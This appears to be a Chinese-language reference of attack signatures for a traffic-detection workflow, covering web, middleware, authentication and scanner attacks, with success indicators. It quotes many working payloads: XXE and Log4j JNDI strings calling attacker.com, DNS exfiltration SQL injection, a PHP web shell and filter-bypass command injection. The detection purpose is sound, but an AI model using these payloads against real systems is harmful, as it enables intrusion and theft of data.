# Attack Signatures Reference — 增强版 v2.0

## 全量特征扫描模式

一条 Payload 可能命中多种攻击类型。**记录所有命中类型**，而非首次命中即退出。
输出攻击类型命中清单 + 攻击结果判定（含回显证据）。

---

## 协议上下文识别（新增）

在特征匹配前，先判断流量方向：

| 方向 | 说明 | 分析重点 |
|------|------|----------|
| 客户端 → 服务端 | 请求方向 | 检测攻击注入、路径遍历、认证绕过 |
| 服务端 → 客户端 | 响应方向 | 检测回显（命令执行结果、数据库报错）、反射 XSS |

**响应体特征（攻击成功判定）**：
- 数据库报错：`SQL syntax`、`mysql_fetch`、`ORA-`、`PostgreSQL`
- 路径遍历成功：`root:x:`、`[drivers]`、`[boot loader]`
- 命令执行回显：`uid=`、`Usage:`、`Can't open`
- 反射 XSS 成功：响应中回显未编码的 `<script>` 或事件处理器
- 敏感数据泄露：`Access Key`、`Secret`、`Authorization: Bearer`

---

## 1. Web 应用攻击


### 1.1 SQL 注入（增强版）
xxxxx需要阅读`cookbook/attack_signatures/sql_injection.md`

**基础特征**：
`union` `select` `and` `or` `--` `#` `sleep` `benchmark` `pg_sleep` `waitfor`

**高级变种**：
- 报错注入：`updatexml` `extractvalue` `polygon()` `GTID_SUBSET` `ST_LatFromGeoHash`
- 时间盲注：`if(condition,sleep(5),0)` `AND (SELECT * FROM (SELECT(SLEEP(5)))a)`
- DNS 外带：`load_file(concat('\\\\',version(),'.ceye.io\\abc'))`
- 二阶注入：`INSERT INTO users (name) VALUES ('admin') -- `（存储后触发）
- 编码绕过：`%55nion` `%53elect`（大小写+URL双重编码）

**成功判定**：响应中含数据库报错信息 / 时间延迟 / DNS 请求外联

### 1.2 XSS（反射/存储/DOM）增强版

**基础特征**：
`<script>` `onerror=` `javascript:` `onload=` `<img src=x>` `<svg>` `onfocus=` `onmouseover`

**现代框架变种**：
- Vue：`{{constructor.constructor('alert(1)')()}}`
- React：`{"javascript:alert(1)"}`（href 属性）
- Angular：`{{$eval.constructor('alert(1)')()}}`、`{{$eval('alert(1)')}}`
- DOM 型：`document.location`、`window.name`、`postMessage` 数据注入

**绕过技巧**：
- `<img src onerror=alert(1)>`（等号空格变种）
- `<ScRiPt>alert(1)</ScRiPt>`（大小写混合）
- `%3Cscript%3Ealert(1)%3C/script%3E`（URL 编码）

**成功判定**：响应体回显未编码的可执行 JavaScript 代码

### 1.3 LFI / 路径遍历（增强版）

**基础特征**：
`../` `..\\` `/etc/passwd` `/etc/shadow` `WEB-INF` `boot.ini` `windows\win.ini`

**高级变种**：
- 双编码：`..%252f..%252f` → `%252f` 解码为 `%2f` 再解码为 `/`
- UTF-16 绕过：`..%c0%af` → `..` + `/`（畸形编码）
- 日志注入：`/var/log/apache/access.log` + PHP 包含 + User-Agent 写马
- 协议封装：`php://filter/convert.base64-encode/resource=index.php`

**成功判定**：响应中含系统文件内容（`root:x:`、`[boot loader]`）或 Base64 编码的源码

### 1.4 文件上传检测（增强版）

**基础扩展名**：
`jsp` `php` `asp` `ashx` `war` `cgi` `pl` `py`

**绕过变种**：
- 双扩展名：`shell.php.jpg` `.php.jpg` `shell.php;.jpg`
- MIME 伪装：`Content-Type: image/jpeg` + PHP 内容
- 空字节注入：`shell.php%00.jpg`
- 内容混淆：`GIF89a;\n<?php system($_GET['cmd']); ?>`

**成功判定**：响应返回上传路径 + 文件可访问（200）

### 1.5 XXE（增强版）

**基础特征**：
`DOCTYPE` `ENTITY` `SYSTEM` `<!` `<!ENTITY` `%xxe`

**高级变种**：
- 参数实体嵌套：`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`
- 盲 XXE（OOB）：`<!ENTITY % payload SYSTEM "http://attacker.com/xxe?data=%file;">`
- 报错 XXE：`<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'file:///etc/hosts'>">`

**成功判定**：响应中回显文件内容 / DNS/HTTP 外联记录

### 1.6 SSTI（模板注入）增强版

**基础语法**：
`{{...}}` `${...}` `<#...>` `*{...}` `#{...}`

**绕过变种**（不同引擎差异）：
- Jinja2：`{{config}}` `{{''.__class__.__mro__[2].__subclasses__()}}`
- Twig：`{{_self.env.registerUndefinedFilterCallback("exec")}}`
- Freemarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- Smarty：`{php}system('id'){/php}`

**成功判定**：响应含配置信息 / 对象属性 / 命令执行结果

### 1.7 SSRF（增强版）

**基础特征**：
`127.0.0.1` `localhost` `10.x.x.x` `172.x.x.x` `192.168.x.x` `169.254.x.x` `0.0.0.0`

**高级绕过**：
- 十进制/十六进制 IP：`2130706433`（127.0.0.1）、`0x7f000001`
- 八进制 IP：`0177.0.0.1`
- 国际化域名（IDN）：`http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`
- URL 解析差异（`http://0.0.0.0`、`http://[::1]`、`http://127.0.0.1.nip.io`）
- 302 跳转跟随：短链接 + 最终指向内网
- `file://` 协议读取本地文件

**成功判定**：响应回显内网服务信息（metadata、API 响应）/ DNS 外联

### 1.8 开放重定向（增强版）

**基础特征**：
`redirect=` `url=` `target=` `?next=` `return=` `?goto=`

**高级变种**：
- 白名单绕过：`example.com.attacker.com`
- 换行绕过：`%0a` + `Location:` 头注入
- `//` 协议相对：`//evil.com`

**成功判定**：响应 Location 头指向外部域名

### 1.9 CRLF 注入（增强版）

**基础特征**：
`%0d%0a` `%0a%0d` `\r\n`

**高级变种**：
- 响应头注入：`%0d%0aSet-Cookie:%20session=hijacked`
- 双 CRLF：`%0d%0a%0d%0a` 后注入 HTML 内容

**成功判定**：响应头部出现注入的 Set-Cookie / 自定义头

---

## 2. 中间件 / 应用框架攻击

### 2.1 命令注入 / RCE（增强版）

**基础特征**：
`ping` `whoami` `cat` `|` `&` `;` `` ` `` `$()` `$(cat` `curl` `wget` `nc`

**高级变种（绕过空格/黑名单）**：
- 花括号：`{cat,/etc/passwd}` `{ls,-la}`
- IFS 变量：`cat${IFS}/etc/passwd`
- 编码执行：`$(echo${IFS}d2hvYW1p|base64${IFS}-d)`（Base64）
- 通配符：`/???/nc` → `/bin/nc`
- 管道无空格：`cat</etc/passwd` `cat<>/etc/passwd`
- 环境变量截取：`${PATH:0:1}` 表示 `/`

**成功判定**：响应回显命令执行结果（`uid=`、`root:x:`、网卡配置等）

### 2.2 Java 反序列化（增强版）

**基础特征**：
`aced0005` `rO0AB`

**高级检测**：
- 检测常见 gadget 链：`org.apache.commons`、`sun.reflect`、`com.sun.rowset`
- 流量特征：`rmi://` `ldap://` `iiop://` + 恶意地址
- URLDNS 链：`dnslog.cn` 域名特征

**成功判定**：外联 DNS/HTTP 记录（盲打）

### 2.3 PHP 反序列化（增强版）

**基础特征**：
`O:` `O:+`

**高级检测**：
- 检测常见 gadget：`GuzzleHttp`、`Monolog`、`Symfony`
- 序列化长度匹配验证

**成功判定**：远程代码执行回显

### 2.4 Python 反序列化（pickle）（增强版）

**基础特征**：
`__builtin__` `cPickle` `pickle` `__reduce__` `__import__`

**高级检测**：
- 检测 opcode：`(S'whoami'\nios\nsystem\n.`
- RCE 构造：`cos\nsystem\n(S'id'\ntR.`

**成功判定**：命令执行回显

### 2.5 OGNL 注入（Struts2）（增强版）

**基础特征**：
`%{` `%#{` `${#`

**高级变种**：
- S2-045（文件上传）：`Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Cmd',#cmd)}`
- S2-057：`${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}`

**成功判定**：响应头出现注入值 / 命令执行回显

### 2.6 JNDI 注入（Log4j）

**基础特征**：
`${jndi:ldap:` `${jndi:rmi:` `${jndi:dns:` `${jndi:ldaps:`

**高级变种**：
- 大小写混淆：`${JNDI:LDAP://...}`
- 嵌套：`${${lower:j}ndi:ldap://...}`
- 远程 class 加载：`ldap://attacker.com/Exploit`

**成功判定**：DNS 外联 / HTTP callback / RCE 回显

### 2.7 EL 表达式注入（增强版）

**基础特征**：
`${...}` `#{...}`

**高级变种**：
- 反射调用：`${pageContext.getClass().forName("javax.script.ScriptEngineManager")...}`
- Tomcat 特定：`${pageContext.response}

**成功判定**：页面输出执行结果 / 敏感信息泄露

---

## 3. API / 认证攻击

### 3.1 LDAP 注入（增强版）

**基础特征**：
`*)(uid=*` `)(|(uid=*` `(&(uid=`

**高级变种**：
- NULL 字节绕过：`admin\0`（C 字符串截断）
- 括号闭合：`uid=admin)(|(cn=*`

**成功判定**：返回非预期用户条目 / 绕过认证

### 3.2 JWT 攻击（增强版）

**基础特征**：
`alg:none` `kid:` 路径遍历 `sub:` 提权

**高级变种**：
- 签名绕过：`alg: HS256` + 弱密钥爆破/猜测
- JKU 注入：`jku: https://attacker.com/jwks.json`（伪造 JWKS）
- X5U 注入：`x5u: https://attacker.com/jwks.json`
- kid 注入：`kid: ../../dev/null`（签名验签绕过）

**成功判定**：服务端接受伪造 token + 返回有效 session

### 3.3 GraphQL 攻击（新增）

**检测特征**：
- 内省查询：`__schema{types{name}}` `__type(name:"User"){fields{name}}`
- 批量查询（BatchQL）：`[{"query":"..."},{"query":"..."}]`
- 深度嵌套：`query { user { posts { comments { user { posts { comments { ... } } } } } }`（DoS）

**成功判定**：返回完整 schema / 数据库负载飙升 / 非预期数据泄露

---

## 4. 爬虫 / 扫描行为（增强版）

### 特征检测（非 Payload 型）

**User-Agent 特征**：
`sqlmap` `nmap` `nikto` `masscan` `wpscan` `dirb` `gobuster` `Burp` `ZAP` `AWVS` `Nessus`

**行为检测（需时间窗口聚合）**：
- 请求频率 > 30 次/秒（同源 IP）
- 路径字典枚举：`/admin` `/wp-admin` `/phpmyadmin` `/backup.zip`
- 参数变异度 > 80%（同 IP + 同一 URL 路径，参数值变化频繁）
- 扫描模式：`/etc/passwd` + `/etc/shadow` + `/etc/hosts` 连续请求

**判定逻辑**：同时命中 UA + 行为特征 → 极可能是扫描器；仅命中 UA → 低可信，可能伪造

---

## 5. 复合攻击 & 交叉攻击标记

**复合攻击检测规则**：

| 组合 | 叠加评分 |
|------|----------|
| Log4j + SQLi | 极高（9.5+） |
| XSS + CSRF | 高（8.5） |
| SSRF + 反序列化 | 极高（9.5+） |
| JNDI + LDAP + RCE | 极高（10） |

**交叉攻击标记示例**：

---

## 6. 未匹配攻击类型

- 标记为 `未匹配攻击类型`
- 不强行归类
- 记录原始 Payload + 请求方法 + URI + 响应状态码
- 收集样本供后续分析（可定期 review 新增特征）

---

## 附录 A：攻击结果判定速查表

| 响应特征 | 攻击结果判定 | 置信度修正 |
|----------|-------------|-----------|
| 数据库报错 + 注入语法 | SQL 注入成功 | +2 |
| 页面回显 `<script>alert` | XSS 成功 | +2 |
| 回显 `root:x:` | LFI/路径遍历成功 | +2 |
| 命令执行回显（uid=）| RCE 成功 | +3 |
| DNS 外联记录 | 盲打成功（XXE/Log4j）| +2 |
| HTTP 状态码 403/500 | 被 WAF/IPS 阻断 | 不扣分，标记“已阻断” |
| 200 OK + 无异常内容 | 无法确定 | 0 |
| 404 未找到 | Payload 未触发 | 0 |

---
